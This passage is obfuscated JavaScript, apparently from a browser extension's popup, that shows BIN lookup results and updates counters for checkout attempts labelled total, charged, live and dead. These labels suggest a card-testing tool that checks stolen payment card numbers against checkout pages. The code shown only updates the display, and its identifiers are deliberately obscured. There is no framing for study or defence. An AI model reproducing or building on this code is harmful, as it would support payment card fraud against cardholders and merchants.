  const _0x4c121f = document.getElementById("binDetails");
  _0x1f700f.style.display = "block";
  _0xa236e4.textContent = "Looking up...";
  _0x4c121f.textContent = "Fetching BIN information from multiple sources...";
}
function showBinError(_0x26b288) {
  const _0x3d4d6b = document.getElementById("binResultCard");
  const _0x4fdbee = document.getElementById("binStatus");
  const _0x219314 = document.getElementById("binDetails");
  _0x3d4d6b.style.display = "block";
  _0x4fdbee.textContent = "Error";
  _0x219314.textContent = _0x26b288;
  _0x4fdbee.style.color = "#dc2626";
}
if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.onMessage) {
  chrome.runtime.onMessage.addListener(function (_0x3e90df, _0x284df5, _0x2abfa6) {
    if (_0x3e90df.type === "CUSTOM_CHECKOUT_STATS_UPDATE" && _0x3e90df.stats) {
      const _0x2a3d64 = _0x3e90df.stats;
      const _0x2fe3c0 = document.getElementById("cc-stat-total");
      const _0xc53480 = document.getElementById("cc-stat-charged");
      const _0x4e341d = document.getElementById("cc-stat-live");
      const _0x28ae37 = document.getElementById("cc-stat-dead");
      if (_0x2fe3c0) {
        _0x2fe3c0.textContent = String(_0x2a3d64.total || 0);
      }
      if (_0xc53480) {
        _0xc53480.textContent = String(_0x2a3d64.charged || 0);
      }
      if (_0x4e341d) {
        _0x4e341d.textContent = String(_0x2a3d64.live || 0);
      }
      if (_0x28ae37) {
        _0x28ae37.textContent = String(_0x2a3d64.dead || 0);
      }
    }
  });
}
